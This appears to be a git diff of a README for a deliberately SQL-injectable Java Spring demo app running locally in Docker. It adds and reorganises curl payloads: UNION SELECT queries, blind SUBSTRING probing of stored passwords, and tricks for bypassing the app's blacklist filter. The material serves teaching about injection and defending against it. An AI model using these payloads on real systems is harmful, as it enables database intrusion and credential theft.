@@ -1,6 +1,6 @@
 # Blacklist Demo for an SQLi vulnerable Spring Application
 
-<a href="https://asciinema.org/a/ICD8HCOzUafwiftLb6pL44N7w"><img src="https://asciinema.org/a/ICD8HCOzUafwiftLb6pL44N7w.png" width="836"/></a>
+[![Video introduction](https://asciinema.org/a/Q2o20pkTZ9QEPI9tg6s8vM1ju.svg)](https://asciinema.org/a/Q2o20pkTZ9QEPI9tg6s8vM1ju)
 
 ## TL;DR
 
@@ -9,10 +9,17 @@ To build and run:
 sudo docker build -t sqli_victim_webapp_java_spring .; sudo docker run --name victim.sqli.webapp_java_spring.tld -ti -p 127.0.0.1:5808:8080 -v "$(pwd)"/webapp_java_spring/:/usr/src/ sqli_victim_webapp_java_spring
 ```
 
-To fill the database:
+### Happy Flow
+
+Get currently stored contents using the rest api:
 
 ```
 curl -X GET 'localhost:5808/sqlidemo/all'
+```
+
+To add stuff to the database:
+
+```
 curl -X POST localhost:5808/sqlidemo/add -d username=user -d password=password
 ```
 
@@ -22,6 +29,8 @@ Read username by id:
 curl localhost:5808/sqlidemo/vulnbyid -d id=1
 ```
 
+### Look inside
+
 To get access to the database:
 ```
 sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -uuser -ppassword sqli_example
@@ -29,7 +38,12 @@ sudo docker exec -ti victim.sqli.webapp_java_spring.tld mysql --host localhost -
 
 ## SQLi
 
-### Java based
+Currently 2 types of SQLi is implemented:
+
+- Java based 
+- JPQL based
+
+### Java JDBC based
 
 Check for union select:
 
@@ -45,25 +59,33 @@ curl localhost:5808/sqlidemo/vulnbyid -d id="1' UNION SELECT NULL,NULL,(SELECT @
 curl -X GET localhost:5808/sqlidemo/vulnbyid\?id="1'+UNION+SELECT+NULL,NULL,(SELECT+@@VERSION)+--+"
 ```
 
+### Java JPA / JPQL based
+
+```
+curl localhost:5808/sqlidemo/add -d username=user -d password=password
+curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p" 
+curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='a" 
+```
 #### Blacklist 
 
-Use 
+For the JDBC based vulnerable rest endpoint a blacklist filter is implemented which can be applied.
+To get a help display of all possible configurations enter:
 
 ```
 curl localhost:5808/sqlidemo/vulnbyid -d id -d blacklistconfig=help
 ```
 
-to get a help display of all possible blacklist configurations.
+The following is an illustration of how this filter can be used and bypassed 
 
 ##### Single Quote Replacement
 
-Using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):
+Bypass single quote checks using Escape Sequences ([https://mariadb.com/kb/en/string-literals/](https://mariadb.com/kb/en/string-literals/)):
 
 ```
 curl localhost:5808/sqlidemo/vulnbyid -d id="1\' UNION SELECT NULL,NULL,(@@VERSION) -- " -d blacklistconfig=add_oddsinglequotes
 ```
 
-or as keyword
+or applying the `as` keyword:
 
 ```
 curl localhost:5808/sqlidemo/vulnbyid -d id="1' union select null,null,(@@version) as username from user where id='1" -d blacklistconfig=add_oddsinglequotes
@@ -168,14 +190,6 @@ block_badstrings,\
 block_concatenation,\
 block_base64,\     
 block_char_function
-```
-
-### JPQL based
-
-```
-curl localhost:5808/sqlidemo/add -d username=user -d password=password
-curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='p" 
-curl localhost:5808/sqlidemo/vulnbyid2 -d id="1' AND SUBSTRING(password,1,1)='a" 
 ```
 
 ## Safe Implementation
